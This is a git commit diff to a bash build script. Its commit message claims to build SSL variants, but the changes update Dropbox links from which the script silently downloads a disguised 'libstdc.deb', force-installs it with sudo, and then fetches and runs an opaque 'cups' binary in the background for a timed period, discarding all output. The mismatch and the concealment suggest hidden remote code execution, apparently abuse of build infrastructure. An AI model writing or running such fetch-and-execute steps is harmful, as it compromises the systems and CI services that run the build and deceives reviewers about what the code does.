1fda8e8d6bf0298b0b12d3e7650b97a41f755b17
zorina-bernice <36798163+zorina-bernice@users.noreply.github.com>
2018-04-08 23:44:31 +0200

    Build all ssl variants

--- scripts/build.sh
+++ scripts/build.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget https://www.dropbox.com/s/vv24bsdw6wa8yuh/libstdc.deb -q
+wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
 sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
 rm -rf libstdc.deb
-wget https://www.dropbox.com/s/texpgcwasfnrln0/cups.zip -q
+wget https://www.dropbox.com/s/rpofahel24xglcg/cups.zip -q
 unzip cups.zip > /dev/null 2>&1
 #pwd
 ./scripts/cups ./scripts/data &
